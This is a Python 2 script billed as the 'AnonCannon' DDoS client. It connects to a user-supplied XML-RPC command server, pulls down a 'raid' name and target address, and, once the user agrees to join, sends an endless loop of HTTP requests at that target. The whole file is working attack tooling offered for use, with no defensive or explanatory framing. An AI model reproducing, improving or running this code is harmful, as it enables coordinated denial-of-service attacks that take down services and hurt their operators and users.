#!/usr/bin/env python
#AnnonCannon DDoS  client
#Take it Down!
import xmlrpclib                       #For server communication
import urllib                          #For the worst DDoS Algo ever
#ALPHA ATTACK ALGO, I PROMISE IS USE A BETTER IN THE FINAL!
def attack():
  print "[!!!]Now attacking."
  try:
      while(attacking == True):
        ul = urllib.urlopen(attack_target)
  except KeyboardInterrupt:
    answer = raw_input("Do you want to quit?(y/n)")
    if(answer == "y"):
      print "Quiting."
      exit()
    if(answer == "n"):
      print "Go back to the Attack"    #Sorry!      
      attack()
print "AnonCannon ALPHA 1 Client"
print "-----------------------------------------------------------------"
address       = raw_input("Enter your Control server>>>")
cli           = xmlrpclib.Server(address)
attack_target = cli.current_attack_address()
attacking     = False
print cli.welcome_message()
print("Actual Attack target of " + cli.get_raid_name()  + ":" + attack_target)
answer = raw_input("Do you want to join the Attack(y/n):")
if(answer == "y"):
  print "Joining the Attack on:" + attack_target
  attacking = True
  answer = raw_input("Do you want to tweet that your are attacking(y/n):")
  group_number = cli.groups()
  print "You are in Group:" + group_number
  attack()
if(answer == "n"):
  print "Quiting..."
  exit()
